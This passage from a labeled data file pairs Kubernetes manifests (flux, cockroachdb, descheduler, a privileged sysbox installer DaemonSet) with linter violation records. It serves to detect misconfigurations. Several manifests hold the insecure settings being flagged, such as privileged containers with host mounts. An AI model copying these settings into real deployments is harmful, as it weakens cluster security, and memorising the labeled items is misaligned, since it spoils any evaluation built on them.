's/(.*):/\\\\1\\\\.\\\\./')\\n      reg_conf_path=\\\"/tmp/serviceca/${dp}\\\"\\\n          \\n      if [ ! -e \\\"${reg_conf_path}\\\" ]; then\\n          rm -rf /etc/docker/certs.d/$d\\n\\\n          \\      fi\\n  done\\n  sleep 60 & wait ${!}\\ndone\\n\"\n        volumeMounts:\n        - name: serviceca\n          mountPath: /tmp/serviceca\n        - name: host\n          mountPath: /etc/docker/certs.d\n      volumes:\n      - name: host\n        hostPath:\n          path: /etc/docker/certs.d\n      - name: serviceca\n        configMap:\n          name: image-registry-certificates\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-ca\" has memory limit 0"
  },
  {
    "id": "11135",
    "manifest_path": "data/manifests/the_stack_sample/sample_4282.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cockroachdb-client-secure\n  labels:\n    app: cockroachdb-client\nspec:\n  serviceAccountName: cockroachdb\n  containers:\n  - name: cockroachdb-client\n    image: cockroachdb/cockroach:v2.1.3\n    command:\n    - sleep\n    - '2147483648'\n    volumeMounts:\n    - name: client-certs\n      mountPath: /cockroach-certs\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: cockroachdb.client.root\n      defaultMode: 256\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cockroachdb-client\" does not have a read-only root file system"
  },
  {
    "id": "11136",
    "manifest_path": "data/manifests/the_stack_sample/sample_4282.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cockroachdb-client-secure\n  labels:\n    app: cockroachdb-client\nspec:\n  serviceAccountName: cockroachdb\n  containers:\n  - name: cockroachdb-client\n    image: cockroachdb/cockroach:v2.1.3\n    command:\n    - sleep\n    - '2147483648'\n    volumeMounts:\n    - name: client-certs\n      mountPath: /cockroach-certs\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: cockroachdb.client.root\n      defaultMode: 256\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"cockroachdb\" not found"
  },
  {
    "id": "11137",
    "manifest_path": "data/manifests/the_stack_sample/sample_4282.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cockroachdb-client-secure\n  labels:\n    app: cockroachdb-client\nspec:\n  serviceAccountName: cockroachdb\n  containers:\n  - name: cockroachdb-client\n    image: cockroachdb/cockroach:v2.1.3\n    command:\n    - sleep\n    - '2147483648'\n    volumeMounts:\n    - name: client-certs\n      mountPath: /cockroach-certs\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: cockroachdb.client.root\n      defaultMode: 256\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cockroachdb-client\" is not set to runAsNonRoot"
  },
  {
    "id": "11138",
    "manifest_path": "data/manifests/the_stack_sample/sample_4282.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cockroachdb-client-secure\n  labels:\n    app: cockroachdb-client\nspec:\n  serviceAccountName: cockroachdb\n  containers:\n  - name: cockroachdb-client\n    image: cockroachdb/cockroach:v2.1.3\n    command:\n    - sleep\n    - '2147483648'\n    volumeMounts:\n    - name: client-certs\n      mountPath: /cockroach-certs\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: cockroachdb.client.root\n      defaultMode: 256\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cockroachdb-client\" has cpu request 0"
  },
  {
    "id": "11139",
    "manifest_path": "data/manifests/the_stack_sample/sample_4282.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cockroachdb-client-secure\n  labels:\n    app: cockroachdb-client\nspec:\n  serviceAccountName: cockroachdb\n  containers:\n  - name: cockroachdb-client\n    image: cockroachdb/cockroach:v2.1.3\n    command:\n    - sleep\n    - '2147483648'\n    volumeMounts:\n    - name: client-certs\n      mountPath: /cockroach-certs\n  volumes:\n  - name: client-certs\n    secret:\n      secretName: cockroachdb.client.root\n      defaultMode: 256\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cockroachdb-client\" has memory limit 0"
  },
  {
    "id": "11140",
    "manifest_path": "data/manifests/the_stack_sample/sample_4283.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: flux\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3031'\n      labels:\n        name: flux\n    spec:\n      serviceAccountName: flux\n      volumes:\n      - name: git-key\n        secret:\n          secretName: flux-git-deploy\n          defaultMode: 256\n      - name: git-keygen\n        emptyDir:\n          medium: Memory\n      containers:\n      - name: flux\n        image: docker.io/fluxcd/flux:1.14.1\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n        ports:\n        - containerPort: 3030\n        livenessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n          readOnly: true\n        - name: git-keygen\n          mountPath: /var/fluxd/keygen\n        args:\n        - --memcached-service=\n        - --ssh-keygen-dir=/var/fluxd/keygen\n        - --git-url=git@github.com:weaveworks/flux-get-started\n        - --git-branch=master\n        - --listen-metrics=:3031\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"flux\" does not have a read-only root file system"
  },
  {
    "id": "11141",
    "manifest_path": "data/manifests/the_stack_sample/sample_4283.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: flux\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3031'\n      labels:\n        name: flux\n    spec:\n      serviceAccountName: flux\n      volumes:\n      - name: git-key\n        secret:\n          secretName: flux-git-deploy\n          defaultMode: 256\n      - name: git-keygen\n        emptyDir:\n          medium: Memory\n      containers:\n      - name: flux\n        image: docker.io/fluxcd/flux:1.14.1\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n        ports:\n        - containerPort: 3030\n        livenessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n          readOnly: true\n        - name: git-keygen\n          mountPath: /var/fluxd/keygen\n        args:\n        - --memcached-service=\n        - --ssh-keygen-dir=/var/fluxd/keygen\n        - --git-url=git@github.com:weaveworks/flux-get-started\n        - --git-branch=master\n        - --listen-metrics=:3031\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"flux\" not found"
  },
  {
    "id": "11142",
    "manifest_path": "data/manifests/the_stack_sample/sample_4283.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: flux\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3031'\n      labels:\n        name: flux\n    spec:\n      serviceAccountName: flux\n      volumes:\n      - name: git-key\n        secret:\n          secretName: flux-git-deploy\n          defaultMode: 256\n      - name: git-keygen\n        emptyDir:\n          medium: Memory\n      containers:\n      - name: flux\n        image: docker.io/fluxcd/flux:1.14.1\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n        ports:\n        - containerPort: 3030\n        livenessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n          readOnly: true\n        - name: git-keygen\n          mountPath: /var/fluxd/keygen\n        args:\n        - --memcached-service=\n        - --ssh-keygen-dir=/var/fluxd/keygen\n        - --git-url=git@github.com:weaveworks/flux-get-started\n        - --git-branch=master\n        - --listen-metrics=:3031\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"flux\" is not set to runAsNonRoot"
  },
  {
    "id": "11143",
    "manifest_path": "data/manifests/the_stack_sample/sample_4283.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: flux\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: flux\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '3031'\n      labels:\n        name: flux\n    spec:\n      serviceAccountName: flux\n      volumes:\n      - name: git-key\n        secret:\n          secretName: flux-git-deploy\n          defaultMode: 256\n      - name: git-keygen\n        emptyDir:\n          medium: Memory\n      containers:\n      - name: flux\n        image: docker.io/fluxcd/flux:1.14.1\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n        ports:\n        - containerPort: 3030\n        livenessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        readinessProbe:\n          httpGet:\n            port: 3030\n            path: /api/flux/v6/identity.pub\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        volumeMounts:\n        - name: git-key\n          mountPath: /etc/fluxd/ssh\n          readOnly: true\n        - name: git-keygen\n          mountPath: /var/fluxd/keygen\n        args:\n        - --memcached-service=\n        - --ssh-keygen-dir=/var/fluxd/keygen\n        - --git-url=git@github.com:weaveworks/flux-get-started\n        - --git-branch=master\n        - --listen-metrics=:3031\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"flux\" has memory limit 0"
  },
  {
    "id": "11144",
    "manifest_path": "data/manifests/the_stack_sample/sample_4286.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: greensvc\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    app: green\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:green])"
  },
  {
    "id": "11145",
    "manifest_path": "data/manifests/the_stack_sample/sample_4287.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: descheduler-job\n  namespace: kube-system\nspec:\n  template:\n    metadata:\n      name: descheduler-pod\n    spec:\n      containers:\n      - name: descheduler\n        image: k8s.gcr.io/descheduler/descheduler:v0.22.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --v\n        - '3'\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10258\n            scheme: HTTPS\n          initialDelaySeconds: 3\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11146",
    "manifest_path": "data/manifests/the_stack_sample/sample_4287.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: descheduler-job\n  namespace: kube-system\nspec:\n  template:\n    metadata:\n      name: descheduler-pod\n    spec:\n      containers:\n      - name: descheduler\n        image: k8s.gcr.io/descheduler/descheduler:v0.22.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --v\n        - '3'\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10258\n            scheme: HTTPS\n          initialDelaySeconds: 3\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"descheduler\" does not expose port 10258 for the HTTPGet"
  },
  {
    "id": "11147",
    "manifest_path": "data/manifests/the_stack_sample/sample_4287.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: descheduler-job\n  namespace: kube-system\nspec:\n  template:\n    metadata:\n      name: descheduler-pod\n    spec:\n      containers:\n      - name: descheduler\n        image: k8s.gcr.io/descheduler/descheduler:v0.22.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --v\n        - '3'\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10258\n            scheme: HTTPS\n          initialDelaySeconds: 3\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"descheduler-sa\" not found"
  },
  {
    "id": "11148",
    "manifest_path": "data/manifests/the_stack_sample/sample_4287.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: descheduler-job\n  namespace: kube-system\nspec:\n  template:\n    metadata:\n      name: descheduler-pod\n    spec:\n      containers:\n      - name: descheduler\n        image: k8s.gcr.io/descheduler/descheduler:v0.22.0\n        volumeMounts:\n        - mountPath: /policy-dir\n          name: policy-volume\n        command:\n        - /bin/descheduler\n        args:\n        - --policy-config-file\n        - /policy-dir/policy.yaml\n        - --v\n        - '3'\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10258\n            scheme: HTTPS\n          initialDelaySeconds: 3\n          periodSeconds: 10\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n      serviceAccountName: descheduler-sa\n      volumes:\n      - name: policy-volume\n        configMap:\n          name: descheduler-policy-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"descheduler\" has memory limit 0"
  },
  {
    "id": "11149",
    "manifest_path": "data/manifests/the_stack_sample/sample_4289.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: testweb\n  name: web\n  namespace: default\nspec:\n  ports:\n  - name: exporter\n    port: 9113\n    targetPort: 9113\n  - name: web\n    port: 8000\n    targetPort: 8000\n  selector:\n    app: testweb\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:testweb])"
  },
  {
    "id": "11150",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sysbox-deploy-k8s\" does not have a read-only root file system"
  },
  {
    "id": "11151",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"sysbox-label-node\" not found"
  },
  {
    "id": "11152",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"sysbox-deploy-k8s\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "11153",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: host-usr-bin\n          mountPath: /mnt/host/usr/bin\n        - name: host-opt-bin\n          mountPath: /mnt/host/opt/bin\n        - name: host-usr-local-bin\n          mountPath: /mnt/host/usr/local/bin\n        - name: host-opt-local-bin\n          mountPath: /mnt/host/opt/local/bin\n        - name: host-usr-lib-mod-load\n          mountPath: /mnt/host/usr/lib/modules-load.d\n        - name: host-opt-lib-mod-load\n          mountPath: /mnt/host/opt/lib/modules-load.d\n        - name: host-run\n          mountPath: /mnt/host/run\n        - name: host-var-lib\n          mountPath: /mnt/host/var/lib\n      volumes:\n      - name: host-etc\n        hostPath:\n          path: /etc\n      - name: host-osrelease\n        hostPath:\n          path: /etc/os-release\n      - name: host-dbus\n        hostPath:\n          path: /var/run/dbus\n      - name: host-run-systemd\n        hostPath:\n          path: /run/systemd\n      - name: host-lib-systemd\n        hostPath:\n          path: /lib/systemd/system\n      - name: host-etc-systemd\n        hostPath:\n          path: /etc/systemd/system\n      - name: host-lib-sysctl\n        hostPath:\n          path: /lib/sysctl.d\n      - name: host-opt-lib-sysctl\n        hostPath:\n          path: /opt/lib/sysctl.d\n      - name: host-usr-bin\n        hostPath:\n          path: /usr/bin/\n      - name: host-opt-bin\n        hostPath:\n          path: /opt/bin/\n      - name: host-usr-local-bin\n        hostPath:\n          path: /usr/local/bin/\n      - name: host-opt-local-bin\n        hostPath:\n          path: /opt/local/bin/\n      - name: host-usr-lib-mod-load\n        hostPath:\n          path: /usr/lib/modules-load.d\n      - name: host-opt-lib-mod-load\n        hostPath:\n          path: /opt/lib/modules-load.d\n      - name: host-run\n        hostPath:\n          path: /run\n      - name: host-var-lib\n        hostPath:\n          path: /var/lib\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"sysbox-deploy-k8s\" is privileged"
  },
  {
    "id": "11154",
    "manifest_path": "data/manifests/the_stack_sample/sample_4293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: sysbox-deploy-k8s\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      sysbox-install: 'yes'\n  template:\n    metadata:\n      labels:\n        sysbox-install: 'yes'\n    spec:\n      serviceAccountName: sysbox-label-node\n      containers:\n      - name: sysbox-deploy-k8s\n        image: registry.nestybox.com/nestybox/sysbox-deploy-k8s:v0.4.1\n        imagePullPolicy: Always\n        command:\n        - bash\n        - -c\n        - /opt/sysbox/scripts/sysbox-deploy-k8s.sh ce install\n        env:\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: host-etc\n          mountPath: /mnt/host/etc\n        - name: host-osrelease\n          mountPath: /mnt/host/os-release\n        - name: host-dbus\n          mountPath: /var/run/dbus\n        - name: host-run-systemd\n          mountPath: /run/systemd\n        - name: host-lib-systemd\n          mountPath: /mnt/host/lib/systemd/system\n        - name: host-etc-systemd\n          mountPath: /mnt/host/etc/systemd/system\n        - name: host-lib-sysctl\n          mountPath: /mnt/host/lib/sysctl.d\n        - name: host-opt-lib-sysctl\n          mountPath: /mnt/host/opt/lib/sysctl.d\n        - name: 